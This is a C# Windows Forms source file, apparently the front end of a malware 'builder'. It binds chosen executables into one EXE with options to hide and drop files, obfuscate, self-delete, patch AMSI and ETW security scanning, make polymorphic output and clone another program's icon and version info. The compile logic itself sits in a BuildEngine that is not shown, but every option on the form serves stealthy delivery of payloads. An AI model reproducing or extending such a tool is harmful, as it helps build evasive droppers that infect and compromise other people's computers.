using Builder.ModulesBuilder;
using Builder.ModulesBuilder.Helper;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Builder
{
    public partial class SilentForm : MetroFramework.Forms.MetroForm
    {
        private string AssemblyFile, IconFile;

        public SilentForm()
        {
            InitializeComponent();
        }
        private void BuildBtn_Click(object sender, System.EventArgs e)
        {
            string
                DropPath = SelectedPath_Box.Text,
                File1 = File1Box.Text,
                File2 = File2Box.Text;

            bool
                HideFile = HideFile_Box.Checked,
                Obfuscator = ObfuscatorChk.Checked,
                SelfDelete = SelfDelete_Chk.Checked,
                Patchers = UseAmsiEtw_Chk.Checked,
                Polymorphic = PolymorphicChk.Checked;


            if (string.IsNullOrEmpty(File1) || string.IsNullOrEmpty(DropPath))
            {
                MessageBox.Show("Please fill all required fields (File 1 and Drop Path)!", "~ Build Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            using (SaveFileDialog save = new SaveFileDialog())
            {
                save.Title = "Save output file!";
                save.Filter = "EXE (*.exe)|*.exe";

                if (save.ShowDialog() == DialogResult.OK)
                {
                    BuildEngine.CompileStub(
                        save.FileName,
                        File1,
                        File2,
                        DropPath,
                        HideFile,
                        Obfuscator,
                        SelfDelete,
                        Patchers,
                        IconFile,
                        AssemblyFile,
                        Polymorphic
                    );
                    MessageBox.Show("The compilation process has been completed!", "/ Build Information /", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        #region Open & Select Events
        private void SelectFile1_Click(object sender, System.EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Select exe file.";
                openFileDialog.Filter = "EXE (*.exe)|*.exe";

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    File1Box.Text = openFileDialog.FileName;
                    return;
                }
            }
        }
        private void File1Box_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effect = DragDropEffects.Copy;

            else
                e.Effect = DragDropEffects.None;
        }

        private void File1Box_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);

                if (files.Length > 0)
                {
                    string filePath = files[0];
                    File1Box.Text = filePath;
                }
            }
        }

        private void File2Box_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effect = DragDropEffects.Copy;

            else
                e.Effect = DragDropEffects.None;
        }

        private void File2Box_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);

                if (files.Length > 0)
                {
                    string filePath = files[0];
                    File2Box.Text = filePath;
                }
            }
        }

        private void SelectFile2_Click(object sender, System.EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Select exe file.";
                openFileDialog.Filter = "EXE (*.exe)|*.exe";

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    File2Box.Text = openFileDialog.FileName;
                    return;
                }
            }
        }

        private void CloneAssemblyBtn_Click(object sender, System.EventArgs e)
        {
            using (OpenFileDialog open = new OpenFileDialog())
            {
                open.Title = "Select any exe file";
                open.Filter = "EXE (*.exe)|*.exe";

                if (open.ShowDialog() == DialogResult.OK)
                {
                    AssemblyFile = 
                        AssemblyEngine.ExtractAndWriteVersionInfo(open.FileName, Path.Combine(Path.GetTempPath(),  $"{Guid.NewGuid().ToString()}.META"));

                    if (AssemblyFile == null)
                    {
                        MessageBox.Show("Cloning assembly failed", "Internal Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }
                }
            }
        }

        private void SelectIconBtn_Click(object sender, System.EventArgs e)
        {
            using (OpenFileDialog open = new OpenFileDialog())
            {
                open.Title = "Select icon file";
                open.Filter = "ICO (*.ico)|*.ico";

                if (open.ShowDialog() == DialogResult.OK)
                {
                    ImageIcon_Box.Image = Image.FromFile(open.FileName);
                    IconFile = open.FileName;
                }
            }

        }

        #endregion

        #region Btn  & About Region
        private void ResetBtn_Click(object sender, EventArgs e)
        {
            if (File1Box.Text != null)
            {
                File1Box.Clear();
            }

            if (File2Box.Text != null)
            {
                File2Box.Clear();
            }

            if (AssemblyFile != null)
            {
                AssemblyFile = null;
            }

            if (IconFile != null && ImageIcon_Box.Image != null)
            {
                IconFile = null; ImageIcon_Box.Image = null;
            }
        }

        private void AuthorLabel_Click(object sender, System.EventArgs e)
        {
            Process.Start("https://t.me/skeemlabs");
        }

        private void GitLabel_Click(object sender, System.EventArgs e)
        {
            Process.Start("https://github.com/k3rnel-dev");
        }

        private void SilentForm_Load(object sender, EventArgs e)
        {
            // Set custom icon for the form to display in taskbar
            string iconPath = Path.Combine(Application.StartupPath, "logo.ico");
            if (File.Exists(iconPath))
            {
                this.Icon = new Icon(iconPath);
            }
        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void CreditsLabel_Click(object sender, System.EventArgs e)
        {
            Process.Start("https://github.com/0xd4d/dnlib");
            Process.Start("https://github.com/EvilBytecode");
        }
        #endregion
    }
}
